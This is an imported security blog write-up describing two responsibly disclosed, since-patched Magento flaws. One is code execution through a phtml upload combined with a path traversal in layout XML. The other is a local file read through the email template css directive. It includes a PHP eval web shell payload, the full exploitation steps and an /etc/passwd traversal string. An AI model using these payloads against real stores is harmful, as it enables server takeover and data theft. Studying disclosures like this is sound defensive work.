---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-01-24_magento-rce-local-file-read-with-low-privilege-admin-rights.md
original_filename: 2019-01-24_magento-rce-local-file-read-with-low-privilege-admin-rights.md
title: Magento – RCE & Local File Read with low privilege admin rights
category: documents
detected_topics:
- path-traversal
- sso
- command-injection
- automation-abuse
- api-security
tags:
- imported
- documents
- path-traversal
- sso
- command-injection
- automation-abuse
- api-security
language: en
raw_sha256: bb7d4efbad4593c3b998d9892681de5ac57e9f99866bdf7a5c0e3373624738a0
text_sha256: 4514a80927f77ead78d2c162e1f01ea2ac7b9450a7051e43890effcfd67ad175
ingested_at: '2026-06-28T07:31:58Z'
sensitivity: unknown
redactions_applied: false
---

# Magento – RCE & Local File Read with low privilege admin rights

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-01-24_magento-rce-local-file-read-with-low-privilege-admin-rights.md
- Source Type: markdown
- Detected Topics: path-traversal, sso, command-injection, automation-abuse, api-security
- Ingested At: 2026-06-28T07:31:58Z
- Redactions Applied: False
- Raw SHA256: `bb7d4efbad4593c3b998d9892681de5ac57e9f99866bdf7a5c0e3373624738a0`
- Text SHA256: `4514a80927f77ead78d2c162e1f01ea2ac7b9450a7051e43890effcfd67ad175`


## Content

---
title: "Magento – RCE & Local File Read with low privilege admin rights"
page_title: "Magento – RCE & Local File Read with low privilege admin rights – SCRT Team Blog"
url: "https://blog.scrt.ch/2019/01/24/magento-rce-local-file-read-with-low-privilege-admin-rights/"
final_url: "https://blog.scrt.ch/2019/01/24/magento-rce-local-file-read-with-low-privilege-admin-rights/"
authors: ["Daniel Le Gall (@Blaklis_)"]
programs: ["Magento"]
bugs: ["LFI", "RCE", "Path traversal"]
publication_date: "2019-01-24"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5453
---

# Magento – RCE & Local File Read with low privilege admin rights

I regularly search for vulnerabilities on big services that allow it and have a Bug Bounty program. Here is a second paper which covers two vulnerabilities I discovered on Magento, a big ecommerce CMS that’s now part of Adobe Experience Cloud. These vulnerabilities have been responsibly disclosed to Magento team, and patched for Magento 2.3.0, 2.2.7 and 2.1.16.

Both of vulnerabilities need low privileges admin account, usually given to Marketing users :

  * The first vulnerability is a command execution using path traversal, and requires the user to be able to create products
  * The second vulnerability is a local file read, and requires the user to be able to create email templates

Here are the details !

## Command Execution in Product Creation

Magento has its own way to define the layout of a product, into the Design tab of the Product creation system. It’s format is XML-based and follows a syntax documented by Magento themselves. The full documentation is here : <https://devdocs.magento.com/guides/v2.3/frontend-dev-guide/layouts/xml-instructions.html>

The interesting thing is the possibility to instantiate blocks with the `<block>` tag, and then to call methods on it with the `<action>` tag. This will only work if the object implements the `Block` interface, by the way. However, I was searching if there’s anything interesting to do with this, and saw the following function for class `Magento\Framework\View\Element\Template` :
  
  
  /**
  * Retrieve block view from file (template)
  *
  * @param string $fileName
  * @return string
  */
  public function fetchView($fileName)
  {
  $relativeFilePath = $this->getRootDirectory()->getRelativePath($fileName);
  \Magento\Framework\Profiler::start(
  'TEMPLATE:' . $fileName,
  ['group' => 'TEMPLATE', 'file_name' => $relativeFilePath]
  );
  
  if ($this->validator->isValid($fileName)) {
  $extension = pathinfo($fileName, PATHINFO_EXTENSION);
  $templateEngine = $this->templateEnginePool->get($extension);
  $html = $templateEngine->render($this->templateContext, $fileName, $this->_viewVars);
  } else {
  $html = '';
  $templatePath = $fileName ?: $this->getTemplate();
  $errorMessage = "Invalid template file: '{$templatePath}' in module: '{$this->getModuleName()}'"
  . " block's name: '{$this->getNameInLayout()}'";
  if ($this->_appState->getMode() === \Magento\Framework\App\State::MODE_DEVELOPER) {
  throw new \Magento\Framework\Exception\ValidatorException(
  new \Magento\Framework\Phrase(
  $errorMessage
  )
  );
  }
  $this->_logger->critical($errorMessage);
  }
  
  \Magento\Framework\Profiler::stop('TEMPLATE:' . $fileName);
  return $html;
  }

This code is responsible for loading templates from file; there’s two extension authorized that are `phtml` (to treat it as PHP template file) and `xhtml` (to treat it as plain HTML file I imagine?). Obviously, we want the PHP thing, that’s more fun.

The `$fileName` parameter is passed into the `\Magento\Framework\View\Element\Template\File\Validator::isValid()` function, that checks if the file is in certain directories (compiled, module or themes directories). This check used the `isPathInDirectories` to do so :
  
  
  protected function isPathInDirectories($path, $directories)
  {
  if (!is_array($directories)) {
  $directories = (array)$directories;
  }
  foreach ($directories as $directory) {
  if (0 === strpos($path, $directory)) {
  return true;
  }
  }
  return false;
  }

This function only checks if the provided path begins by a specific directory name (ex: `/path/to/your/magento/app/code/Magento/Theme/view/frontend/`). However, it does not control that’s the resolved path is still in those whitelisted directories. That means there’s an obvious path traversal in this function that we can call through a Product Design. However, it will only process `.phtml` file as PHP code, which is a forbidden extension on most upload forms. 

“Most of upload forms” means there’s exception! You can create a file with “Custom Options”, and one is “File”. I imagine this is in case the customer wants to send a 3D template or instructions for its order. The real reason isn’t that important, the fact is that you can allow extensions you want to be uploaded, including `phtml`. Once the item is ordered, the uploaded file will be stored in `/your/path/to/magento/pub/media/custom_options/quote/firstLetterOfYourOriginalFileName/secondLetterOfYourOriginalFileName/md5(contentOfYourFile).extension`

This is sufficient for having a command execution payload. Here is the complete steps : 

  1. Log in with a user that has some low admin privileges and is allowed to create products
  2. First of all, create a new product, with a new `Custom Options` of type `File`, with `.phtml` as an authorized extension and some pieces in stock to order one.
  3. Go on the frontend, on the product you just created. Upload your `.phtml` and set the item in your cart. For example, my file is named “`blaklis.phtml`” and contains “`<?php eval(stripslashes($_REQUEST[0])); ?>`“
  4. The `.phtml` file is uploaded to `/your/path/to/magento/pub/media/custom_options/quote/_firstLetterOfYourOriginalFileName_ /_secondLetterOfYourOriginalFileName_ /_md5(contentOfYourPhtmlFile)_.phtml`. For example, for my file, the location will be `/your/path/to/magento/pub/media/custom_options/quote/b/l/11e48860e4cdacada256445285d56015.phtml`
  5. You must have the full path to the application to use the `fetchView` function. An easy way to retrieve it is to run the following request :  

  
  POST /magentoroot/index.php/magentoadmin/product_video/product_gallery/retrieveImage/key/[key]/?isAjax=true HTTP/1.1  
  [...]  
  Connection: close  
  
  remote_image=https://i.vimeocdn.com/video/41237643_640.jpg%00&form_key={{your_form_key}} 

This will make CURL crash and display an error with full path in it
  6. In the design tab of the product, add a 2 column layouts with the following XML in `Layout Update XML` :  

  
  <referenceContainer name="sidebar.additional">  
  <block class="Magento\Backend\Block\Template" name="test">  
  <action method="fetchView">  
  <argument name="fileName" xsi:type="string">/path/to/your/magento/app/code/Magento/Theme/view/frontend/../../../../../../pub/media/custom_options/quote/b/l/11e48860e4cdacada256445285d56015.phtml</argument>  
  </action>  
  </block>  
  </referenceContainer> 

  7. Go to the frontend page of this product; your code should executed.

This flaw was not that obvious, but has been fun to search for!

## Local File Read in Email Templating

This one is a lot easier; in fact, it was a pretty obvious one. Email templating allow to use some special directives, surrounded by `{{ }}`. One of these directives is `{{css 'path'}}` to load the content of a CSS file into the email. The path parameter is vulnerable to path traversal, and can be used to inject any file into the email template.

The functions that are managing this directive are the following : 
  
  
  public function cssDirective($construction)
  {
  if ($this->isPlainTemplateMode()) {
  return '';
  }
  
  $params = $this->getParameters($construction[2]);
  $file = isset($params['file']) ? $params['file'] : null;
  if (!$file) {
  // Return CSS comment for debugging purposes
  return '/* ' . __('"file" parameter must be specified') . ' */';
  }
  
  $css = $this->getCssProcessor()->process(
  $this->getCssFilesContent([$params['file']])
  );
  
  if (strpos($css, ContentProcessorInterface::ERROR_MESSAGE_PREFIX) !== false) {
  // Return compilation error wrapped in CSS comment
  return '/*' . PHP_EOL . $css . PHP_EOL . '*/';
  } elseif (!empty($css)) {
  return $css;
  } else {
  // Return CSS comment for debugging purposes
  return '/* ' . sprintf(__('Contents of %s could not be loaded or is empty'), $file) . ' */';
  }
  }
  
  
  public function getCssFilesContent(array $files)
  {
  // Remove duplicate files
  $files = array_unique($files);
  $designParams = $this->getDesignParams();
  if (!count($designParams)) {
  throw new \Magento\Framework\Exception\MailException(
  __('Design params must be set before calling this method')
  );
  }
  $css = '';
  try {
  foreach ($files as $file) {
  $asset = $this->_assetRepo->createAsset($file, $designParams);
  $pubDirectory = $this->getPubDirectory($asset->getContext()->getBaseDirType());
  if ($pubDirectory->isExist($asset->getPath())) {
  $css .= $pubDirectory->readFile($asset->getPath());
  } else {
  $css .= $asset->getContent();
  }
  }
  } catch (ContentProcessorException $exception) {
  $css = $exception->getMessage();
  } catch (\Magento\Framework\View\Asset\File\NotFoundException $exception) {
  $css = '';
  }
  
  return $css;
  }

Those 2 functions are not checking for path traversal characters anywhere, and are indeed vulnerable.

Creating an email template with the `{{css file="../../../../../../../../../../../../../../../etc/passwd"}}` should be sufficient to trigger the vulnerability.

Here is the responsible disclosure timeline for these 2 bugs : firstly, for the RCE one, and then for the file read one

  * 2018.09.11 : initial disclosure for the path traversal / RCE
  * 2018.09.17 : triaged by Bugcrowd staff
  * 2018.10.08 : triaged by Magento staff
  * 2018.11.28 : patch issued by Magento; release 2.2.7 and 2.1.16 released
  * 2018.12.11 : a $5000 bounty was awarded

  * 2018.08.09 : initial disclosure for the path traversal / local file read
  * 2018.08.29 : triaged by Bugcrowd staff after asking for details
  * 2018.10.08 : triaged by Magento staff
  * 2018.11.28 : patch issued by Magento; release 2.2.7 and 2.1.16 released
  * 2019.01.04 : a $2500 bounty was awarded

Posted on [January 24, 2019January 12, 2023](/2019/01/24/magento-rce-local-file-read-with-low-privilege-admin-rights/)Author [blogscrt](/author/blogscrt/)Categories [Vulnerability](/category/vulnerability/)Tags [exploit](/tag/exploit/), [web](/tag/web/)
